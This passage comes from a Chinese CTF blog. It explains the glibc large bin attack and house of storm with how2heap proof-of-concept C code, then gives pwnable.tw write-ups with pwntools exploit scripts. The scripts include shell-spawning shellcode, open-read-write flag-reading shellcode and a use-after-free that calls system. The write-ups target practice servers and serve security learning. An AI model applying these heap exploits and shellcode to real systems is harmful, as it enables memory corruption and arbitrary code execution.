*)(p3[<span class="hljs-number">0</span>]));<br> <br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>            <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>            <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>            <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">//------------------------------------</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>            <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-keyword">void</span> *)stack_var1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-keyword">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h4><p>glibc-2.27~glibc-2.29</p>
<p>house-of-storm，利用伪造在largebin中的bk_nextsize、bk获得任意地址写入堆地址与unsorted bin attack的结合可以使得该利用方法变成任意可以内存申请的攻击方式。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>=malloc(<span class="hljs-number">0</span>x<span class="hljs-number">400</span>-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>) //A<br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">10</span>)         //gap<br><span class="hljs-attribute">B</span>=malloc(<span class="hljs-number">0</span>x<span class="hljs-number">420</span>-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>) //B<br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">10</span>)         //gap<br><br><span class="hljs-attribute">free</span>(A)        //free A into unsorted bin.<br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">500</span>)  //sort A into largebin.<br><span class="hljs-attribute">free</span>(B)        //free B into unsorted bin.<br><br><span class="hljs-attribute">A</span>+<span class="hljs-number">0</span>x<span class="hljs-number">18</span>=evil_addr-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>+<span class="hljs-number">8</span>-<span class="hljs-number">5</span>  //A-&gt;bk_nextsize=evil_addr-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>+<span class="hljs-number">8</span>-<span class="hljs-number">5</span>. <br><span class="hljs-attribute">A</span>+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>=evil_addr+<span class="hljs-number">8</span>          //A-&gt;bk=evil_addr+<span class="hljs-number">8</span>.<br><br><span class="hljs-attribute">B</span>+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>=evil_addr            //B-&gt;bk=evil_addr<br><br><span class="hljs-attribute">malloc</span>(<span class="hljs-number">0</span>x<span class="hljs-number">48</span>)    //evil_addr are malloced out here.<br></code></pre></td></tr></table></figure>

<p>攻击代码场景如上所示，设我们想要申请的内存地址（如<code>__free_hook</code>）为<code>evil_addr</code>。攻击之前我们在largebin中布置一个堆块A，在unsorted bin中布置一个堆块B，其中B的size大于A的size，这样在插入到largebin时才会触发相应代码。</p>
<p>如上所示，我们将A的<code>bk_nextsize</code>改成了<code>evil_addr-0x20+8-5</code>，将A的<code>bk</code>改成了<code>evil_addr+8</code>，且将B的<code>bk</code>改成了<code>evil_addr</code>。</p>
<p>当执行<code>malloc(0x48)</code>时，程序会遍历 unsorted bin 并将 unsorted bin 中的 chunk 取下插入到相应的块中，首先将B取下，此时unsorted bin attack触发，B的<code>bk</code>指向<code>evil_addr</code>，将B从unsorted bin中取下之后，unsorted bin的bk指向了<code>evil_addr</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk; <span class="hljs-comment">//伪造该bk指向`evil_addr`</span><br>...<br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsorted -&gt; bk指向evil_addr</span><br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<p>接着就是把B插入到相应的largebin 链表中，在开启PIE的程序中，堆地址一般为0x56或0x55开头。因此我们可以利用一次写堆地址的能力往<code>evil_addr+0x8-5</code>的地址写堆的地址，使得该地址的size位为0x55或0x56。接着利用另一次写堆地址的能力往<code>evil_addr+0x18</code>的地址写堆的地址，使得该地址的bk位为堆地址，形成了如下的chunk：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">heap &amp;__free_hook<br>$<span class="hljs-number">1</span>=&#123;<br>  prev_size = xxxxxxxxxx, <br>  size = <span class="hljs-number">0x56</span>, <br>  fd = <span class="hljs-number">0x7f</span>xxxxxxxxxxxx, <br>  bk = <span class="hljs-number">0x56</span>xxxxxxxxxxxx, <br>  fd_nextsize = <span class="hljs-number">0</span>, <br>  bk_nextsize = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>再次调用for循环取下unsorted bin时，就会取出<code>evil_addr</code>，且此时的<code>evil_addr-&gt;bk</code>为堆地址，因此可以绕过<code>bck-&gt;fd = unsorted_chunks (av)</code>限制，而<code>evil_addr</code>的大小刚好为<code>0x56</code>或<code>0x55</code>，为0x48所对应的size，所以就会被申请出来，实现了任意可写地址申请。</p>
<p>house of storm 是一个任意可写地址申请漏洞。利用largebin两次写堆地址伪造出来了一个堆块，同时利用unsorted bin attack将该伪造的堆块链接到 unsorted bin 中，实现任意地址申请，非常的巧妙。</p>
<h2 id="高版本的利用"><a href="#高版本的利用" class="headerlink" title="高版本的利用"></a>高版本的利用</h2><p>从glibc-2.30开始，加入了两个检查，让之前的 large bin attack 发生了一些变化（似乎仅仅只是第二种方法发生了变化）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>   malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br><br>bck = fwd-&gt;bk;<br><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd));<br>   malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>之前只是伪造了bk_nextsize，那么肯定是无法满足fwd-&gt;bk_nextsize-&gt;fd_nextsize == fwd；同理，也只是伪造了bk，也无法满足bck-&gt;fd == fwd。</p>
<p>分析利用源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<br>_int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes) &#123;<br>...<br>	<span class="hljs-comment">//① 遍历unsorted bin，依次取出放入对应的位置</span><br>     <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123;<br>      ...<br>      <span class="hljs-comment">//② 注意main_area-&gt;last_remainder，不然直接split了</span><br>      ...<br>           <span class="hljs-keyword">if</span> (in_smallbin_range (size)) &#123;<br>             ...<br>           &#125;<br>           <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck) &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert (chunk_main_arena (bck-&gt;bk));<br>                  <span class="hljs-comment">//③ 需要走到这个分支，另一个分支已经有double link检查了，无法利用</span><br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size)<br>                      &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask (bck-&gt;bk)) &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      <span class="hljs-comment">//④ 利用的关键两行代码 fwd-&gt;fd指向的是可控的内存</span><br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      ...<br>                      &#125;<br>			...<br>			&#125;<br>         &#125;<br>      &#125;<br>	      <br>...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当unsorted bin的一个chunk进入large bin时，large bin 的链表就尝试加入这个bin<br>于是就有：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize<br><br>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure>

<p>其中 fwd-&gt;fd 的 chunk 是攻击者控制的，将 fwd-&gt;fd-&gt;bk_nextsize 设成 targetAddr - 0x20。</p>
<p>下面是how2heap的poc。可以增加理解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A revisit to large bin attack for after glibc2.30</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Relevant code snippet :</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="hljs-comment">		fwd = bck;</span><br><span class="hljs-comment">		bck = bck-&gt;bk;</span><br><span class="hljs-comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="hljs-comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="hljs-comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="hljs-comment">	&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span><br>  setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 1 : \n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 2 : \n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This prevents the traditional large bin attack\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);<br>  <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> target = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);<br>  <span class="hljs-keyword">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x428</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-keyword">size_t</span> *g1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And another chunk to prevent consolidate\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);<br>  <span class="hljs-keyword">size_t</span> *g2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-keyword">size_t</span> *g3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  p1[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">size_t</span>)((&amp;target)<span class="hljs-number">-4</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="hljs-number">-4</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> *g4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, p1<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, (<span class="hljs-keyword">void</span> *)target);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="hljs-keyword">size_t</span>*)target);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);<br><br>  assert((<span class="hljs-keyword">size_t</span>)(p2<span class="hljs-number">-2</span>) == target);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>构造手法总结如下：</p>
<ul>
<li>ptr1 比 ptr2 大，申请了 ptr1 后将其 free。</li>
<li>让 ptr1 进入 large bin。</li>
<li>free 掉 ptr2，将 ptr1 的 bk_nextsize 改为 target-0x20 的地址。</li>
<li>让 ptr2 进入 large bin。</li>
</ul>
<p>最终，target 上写入 ptr2 的地址。</p>
<p>注：最终触发攻击时不一定需要申请一块 ptr2 大的堆块，只要申请堆块时，分配空间的是 ptr2，即可完成攻击。</p>
<p>至此，从 glibc-2.23到最新的glibc-2.34仍然可以使用的large bin attack 全部学习完毕了，至于如何巧妙地运用这个攻击，就要看实战了。</p>
<p>来源：</p>
<p>主要：<a href="https://ray-cp.github.io/archivers/ptmalloc_argebin_attack">https://ray-cp.github.io/archivers/ptmalloc_argebin_attack</a></p>
<p><a href="https://blog.csdn.net/qq_23066945/article/details/103070322">https://blog.csdn.net/qq_23066945/article/details/103070322</a></p>
<p><a href="https://blog.csdn.net/easy_level1/article/details/117445936#t4">https://blog.csdn.net/easy_level1/article/details/117445936#t4</a></p>
]]></content>
      <tags>
        <tag>largebin</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw</title>
    <url>/2021/11/08/2021-12-08-pwnable-tw/</url>
    <content><![CDATA[<p>某个大佬说过，pwnable.tw的题目rank比较高，要把这里的题目都刷一遍，才算是有基础可以进行漏洞挖掘，学pwn也快一年了，今天开始慢慢地把这里的题目一一进行复现，然后再去学习漏洞挖掘的相关知识，同时这里题目质量高，CTF的帮助应该也很大 ，加油吧，👶还期待着成为👴的那天</p>
<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>这题在buu上做过，不细说了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10000</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;Let&#x27;s start the CTF:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(payload)<br>addr = u32(p.recv(<span class="hljs-number">4</span>)) + <span class="hljs-number">0x14</span><br>log.info(<span class="hljs-built_in">hex</span>(addr))<br>shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor eax,eax       </span><br><span class="hljs-string">xor edx,edx			</span><br><span class="hljs-string">push edx				</span><br><span class="hljs-string">push 0x68732f2f       </span><br><span class="hljs-string">push 0x6e69622f       </span><br><span class="hljs-string">mov ebx,esp           </span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">mov al,0xB           </span><br><span class="hljs-string">int 0x80               </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(addr) + asm(shellcode)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20211109203654763.png"><span class="image-caption">image-20211109203654763</span></p>
<p>checksec一下，32位，只开了Canary</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20211109203821716.png"><span class="image-caption">image-20211109203821716</span></p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20211109203905145.png"><span class="image-caption">image-20211109203905145</span></p>
<p>程序很简单，开了个沙箱，然后就是输入shellcode，并且帮你执行。沙箱允许执行open、read、write</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20211109204349251-16472697731021.png"><span class="image-caption">image-20211109204349251</span></p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20211109204410933.png"><span class="image-caption">image-20211109204410933</span></p>
<p>写入的地址也是可写可执行的，所以直接写入orw的shellcode执行即可，但是要注意，flag在/home/orw/flag，然后为了四字节对齐，可以写两个0x2f，毕竟两个//这个是没有影响的</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20211109205838679.png"><span class="image-caption">image-20211109205838679</span></p>
<p>成功！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10001</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give my your shellcode:&quot;</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	push 0x0;</span><br><span class="hljs-string">	push 0x67616c66;</span><br><span class="hljs-string">	push 0x2f77726f;</span><br><span class="hljs-string">	push 0x2f2f656d;</span><br><span class="hljs-string">	push 0x6f682f2f;</span><br><span class="hljs-string">	mov ebx,esp;</span><br><span class="hljs-string">	xor ecx,ecx;</span><br><span class="hljs-string">	xor edx,edx;</span><br><span class="hljs-string">	mov eax,0x5;</span><br><span class="hljs-string">	int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov ebx,eax;</span><br><span class="hljs-string">	mov eax,0x3;</span><br><span class="hljs-string">	mov ecx,esp;</span><br><span class="hljs-string">	mov edx,0x50;</span><br><span class="hljs-string">	int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov eax,0x4;</span><br><span class="hljs-string">	mov ebx,0x1;</span><br><span class="hljs-string">	int 0x80</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>    )<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>这题在BUU上也做过了，直接贴wp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>, <span class="hljs-number">10102</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = <span class="hljs-number">0x804862b</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(puts) + p32(read_got))<br>show(<span class="hljs-number">0</span>)<br>read = u32(p.recv(<span class="hljs-number">4</span>))<br>system = read - libc.symbols[<span class="hljs-string">&quot;read&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-built_in">hex</span>(system))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>, p32(system) + <span class="hljs-string">&quot;;sh\x00&quot;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="BabyStack"><a href="#BabyStack" class="headerlink" title="BabyStack"></a>BabyStack</h2><p>checksec一下，64位，保护全开。</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220314171650601.png"><span class="image-caption">image-20220314171650601</span></p>
<p>程序只有两个输入点，一检查全都是不够溢出的，所以我猜测可能是栈比较近，可以引发strcpy不被 ‘\x00’ 截断，从而不断复制，导致溢出覆盖。</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220314171712265.png"><span class="image-caption">image-20220314171712265</span></p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220314171722608.png"><span class="image-caption">image-20220314171722608</span></p>
